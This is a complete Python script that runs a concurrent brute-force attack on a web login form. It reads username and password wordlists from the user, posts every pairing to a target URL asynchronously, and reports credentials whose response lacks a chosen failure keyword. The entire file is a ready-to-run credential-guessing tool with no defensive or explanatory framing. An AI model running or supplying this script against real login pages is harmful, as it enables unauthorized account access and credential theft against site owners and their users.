import aiohttp
import asyncio
import sys
import time

# User inputs
TARGET_URL = input("Enter the target login URL: ")
USE_USERNAME_WORDLIST = input("Do you want to use a username wordlist? (yes/no): ").strip().lower() == "yes"
USE_PASSWORD_WORDLIST = input("Do you want to use a password wordlist? (yes/no): ").strip().lower() == "yes"

# Load usernames
if USE_USERNAME_WORDLIST:
    USERNAME_WORDLIST_PATH = input("Enter the path to your username wordlist file: ")
    try:
        with open(USERNAME_WORDLIST_PATH, 'r') as file:
            usernames = [line.strip() for line in file]
    except FileNotFoundError:
        print("[ERROR] Username wordlist file not found!")
        sys.exit()
else:
    usernames = [input("Enter a single username to test: ")]

# Load passwords
if USE_PASSWORD_WORDLIST:
    PASSWORD_WORDLIST_PATH = input("Enter the path to your password wordlist file: ")
    try:
        with open(PASSWORD_WORDLIST_PATH, 'r') as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print("[ERROR] Password wordlist file not found!")
        sys.exit()
else:
    passwords = [input("Enter a single password to test: ")]

ERROR_INDICATOR = input("Enter a keyword from the response that indicates failure (e.g., 'Invalid login'): ")
CONCURRENT_REQUESTS = int(input("Enter number of concurrent requests: "))  # Number of parallel requests

print(f"[+] Starting brute force attack on {TARGET_URL}")

async def attempt_login(session, username, password):
    """Attempt login asynchronously."""
    data = {"username": username, "password": password}
    async with session.post(TARGET_URL, data=data) as response:
        text = await response.text()
        if ERROR_INDICATOR not in text:
            print(f"[SUCCESS] Credentials found: {username} | {password}")
            return username, password
        else:
            print(f"[-] Attempt failed: {username} | {password}")
    return None

async def brute_force():
    """Execute brute force attempts asynchronously."""
    async with aiohttp.ClientSession() as session:
        tasks = []
        for username in usernames:
            for password in passwords:
                tasks.append(attempt_login(session, username, password))
                
                if len(tasks) >= CONCURRENT_REQUESTS:
                    results = await asyncio.gather(*tasks)
                    for result in results:
                        if result:
                            print(f"[+] Valid credentials found: {result}")
                            return
                    tasks = []  # Reset task list to avoid overloading
                    await asyncio.sleep(1)  # Maintain proper request order

        # Run any remaining tasks
        results = await asyncio.gather(*tasks)
        for result in results:
            if result:
                print(f"[+] Valid credentials found: {result}")
                return

    print("[!] Brute force complete. No valid credentials found.")

if __name__ == "__main__":
    asyncio.run(brute_force())
